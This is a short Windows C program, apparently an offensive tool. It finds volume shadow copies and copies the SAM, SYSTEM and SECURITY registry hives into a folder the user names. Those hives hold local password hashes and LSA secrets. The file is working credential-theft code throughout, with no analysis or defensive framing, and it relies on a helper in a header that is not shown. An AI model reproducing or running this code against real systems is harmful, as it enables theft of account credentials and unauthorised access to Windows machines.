#include <windows.h>
#include <stdio.h>
#include "structs.h"

void Copy(wchar_t* vss, wchar_t* destination) {
	HANDLE file = CreateFile(vss, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file != INVALID_HANDLE_VALUE) {
		DWORD size = GetFileSize(file, NULL);
		char* data = (char*)malloc(size);
		DWORD bytesread = 0;
		DWORD byteswritten = 0;

		bool success = ReadFile(file, data, size, &bytesread, NULL);
		if (success) {



			HANDLE copy = CreateFile(destination, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (copy != INVALID_HANDLE_VALUE) {

				success = WriteFile(copy, data, size, &byteswritten, NULL);
				if (success) {
					printf("Data written to %ws\n", destination);
				}
				free(data);
				CloseHandle(copy);
				CloseHandle(file);
			}
		}


	}

}
int wmain(int argc, wchar_t* argv[])

{

	Data shadowcopy = Find();
	wchar_t* destination = (wchar_t*)malloc(512);
	swprintf(destination, 256, L"%s\\sam.hive", argv[1]);
	Copy(shadowcopy.sam_hive, destination);
	swprintf(destination, 256, L"%s\\system.hive", argv[1]);
	Copy(shadowcopy.system_hive, destination);
	swprintf(destination, 256, L"%s\\security.hive", argv[1]);
	Copy(shadowcopy.security_hive, destination);
	free(shadowcopy.sam_hive);
	free(shadowcopy.system_hive);
	free(shadowcopy.security_hive);
	free(destination);



}